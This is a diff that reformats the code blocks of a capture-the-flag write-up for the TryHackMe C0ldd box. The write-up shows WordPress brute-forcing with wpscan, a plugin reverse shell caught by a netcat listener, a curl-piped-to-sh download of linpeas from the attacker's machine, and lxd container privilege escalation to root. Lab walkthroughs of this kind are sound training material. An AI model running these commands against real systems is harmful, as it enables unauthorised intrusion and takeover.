@@ -5,7 +5,6 @@ It is a cool box (literally). So lets start some Hacking …
 So lets start with some nmap scan to enumerate which all ports are open.
 ```bash
 # nmap -T4 -sV -A target > nmap_scan.txt 
-
 ```
 ![1](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/1.png)
 
@@ -27,7 +26,6 @@ option to bruteforce wordpress login is using wpscan.
 
 ```bash
 $ wpscan --url http://target/wp-login.php -e u -P /usr/share/wordlist/rockyou.txt 
-
 ```
 ![4](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/4.png)
 
@@ -36,22 +34,27 @@ admin dashboard.
 
 Lest get a reverse shell on the target using WP plugin. I found this simple
 reverse shell script on
-<https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-she
-ll>.
+<https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell>.
 
 ![5](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/5.png)
 
 I started a netcat listener on my machine on port 8000 
-```bash # nc -lvnp 8000 ```
+```bash 
+# nc -lvnp 8000 
+```
 and got a reverse shell by activating our plugin and found that www-data
 user have very less permissions thus I enumerated the target using
 [linpeas.sh]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suit
 e/tree/master/linPEAS ).Download the linpeas.sh file form Github on your
 machine,cd to the downloaded directory and start a simple python server on
 your machine 
-```bash # python3 -m http.server 1234 ``` 
+```bash 
+# python3 -m http.server 1234 
+``` 
 and on target run it using
-```bash $ curl http://<attackbox_ip>:1234/linpeas.sh | sh ```
+```bash 
+$ curl http://<attackbox_ip>:1234/linpeas.sh | sh 
+```
 This will directly
 run the shell script on the target machine.
 
@@ -60,10 +63,14 @@ run the shell script on the target machine.
 This gave away wp-config.php file that contained password of user _c0ldd_.
 To su to _c0ldd_ user we need a stable shell, stablizing shell by this great
 one-liner 
-```bash $ pyhton3 -c ‘import pty;pty.spawn(“/bin/bash”)  $ su c0ldd ```
+```bash 
+$ pyhton3 -c ‘import pty;pty.spawn(“/bin/bash”)  $ su c0ldd 
+```
 and use password _cybersecurity_ to get access. Now cat the user.txt flag in
 /home/c0ldd directory 
-```bash $ cat /home/c0ldd/user.txt ```
+```bash 
+$ cat /home/c0ldd/user.txt 
+```
 
 ![7](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/7.png)
 
@@ -82,7 +89,8 @@ cd to download dir and start http server and transfer the file to target machine
 using wget.
 
 > Add the image :
-```bash $ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+```bash 
+$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 $ lxc image list -- You can see your new imported image
 ```
 > Create a container and add root path
@@ -100,7 +108,9 @@ $ lxc exec privesc /bin/sh
 
 As this container is mounted with /root directory we can access root.txt
 inside it 
-```bash $ cat /mnt/root/root.txt ```
+```bash 
+$ cat /mnt/root/root.txt 
+```
 
 ![9](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/9.png)
 
